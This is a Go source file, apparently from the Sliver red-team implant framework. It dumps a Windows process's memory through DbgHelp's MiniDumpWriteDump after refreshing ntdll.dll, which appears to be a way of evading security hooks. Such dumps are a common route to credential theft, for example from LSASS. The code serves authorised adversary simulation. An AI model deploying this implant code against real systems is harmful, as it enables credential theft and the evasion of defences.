package Pdump

import (
	"fmt"
	"io/ioutil"

	//{{if .Debug}}
	"log"
	//{{end}}

	// {{if eq .GOARCH "amd64"}}
	"github.com/bishopfox/sliver/sliver/taskrunner"
	// {{end}}
	"os"
	"syscall"
	"unsafe"
)









func minidump(pid, proc int) (ProcessDump, error) {
	dump := &WindowsDump{}
	dbgHelp := syscall.NewLazyDLL("DbgHelp.dll")
	minidumpWriteDump := dbgHelp.NewProc("MiniDumpWriteDump")
	// {{if eq .GOARCH "amd64"}}
	// Hotfix for #66 - need to dig deeper
	err := taskrunner.RefreshPE(`c:\windows\system32\ntdll.dll`)
	if err != nil {
		//{{if .Debug}}
		log.Println("RefreshPE failed:", err)
		//{{end}}
		return dump, err
	}
	// {{end}}
	// TODO: find a better place to store the dump file
	f, err := ioutil.TempFile("", "")
	if err != nil {
		//{{if .Debug}}
		log.Println("Failed to create temp file:", err)
		//{{end}}
		return dump, err
	}

	if err != nil {
		return dump, err
	}
	stdOutHandle := f.Fd()
	r, _, e := minidumpWriteDump.Call(ptr(proc), ptr(pid), stdOutHandle, 3, 0, 0, 0)
	if r != 0 {
		data, err := ioutil.ReadFile(f.Name())
		dump.data = data
		if err != nil {
			//{{if .Debug}}
			log.Println("ReadFile failed:", err)
			//{{end}}
			return dump, err
		}
		os.Remove(f.Name())
	} else {
		//{{if .Debug}}
		log.Println("Minidump syscall failed:", e)
		//{{end}}
		return dump, e
	}
	return dump, nil
}